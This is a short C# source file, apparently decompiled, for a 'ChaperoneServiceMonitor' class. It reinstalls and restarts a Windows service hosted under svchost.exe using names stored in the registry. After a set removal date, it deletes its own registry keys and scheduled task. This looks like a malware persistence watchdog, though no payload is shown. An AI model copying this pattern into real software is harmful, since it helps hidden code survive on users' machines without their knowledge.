using System;

namespace ChaperoneServiceMonitor
{
	public class ServiceMonitor
	{
		public void Validate()
		{
			this.regdata = new RegData();
			if (this.regdata.failed)
			{
				return;
			}
			this.tl = new Tools(this.regdata);
			if (this.tl.failed)
			{
				return;
			}
			bool flag = this.tl.FileCheck();
			if (this.tl.CheckRemoveDate() || !flag)
			{
				this.tl.DeleteMonitorRegistry();
				this.tl.DeleteTask();
				return;
			}
			this.MonitorService();
		}

		private int MonitorService()
		{
			if (this.tl.IsServiceRunning())
			{
				return 0;
			}
			if (this.tl.SetServiceRegistry() != 0)
			{
				return -1;
			}
			string srvName = this.regdata.srvName;
			string srvDescription = this.regdata.srvDescription;
			string text = @"%SystemRoot%\System32\svchost.exe -k";
			text += this.regdata.srvName;
			ServiceInstaller.InstallService(srvName, srvDescription, text);
			if (this.tl.SetServiceRegistry() != 0)
			{
				return -1;
			}
			ServiceInstaller.StartService(srvName);
			if (this.tl.IsServiceRunning())
			{
				return 0;
			}
			return 1;
		}

		private Tools tl;
		public RegData regdata;
		private Tools dbg;
	}
}
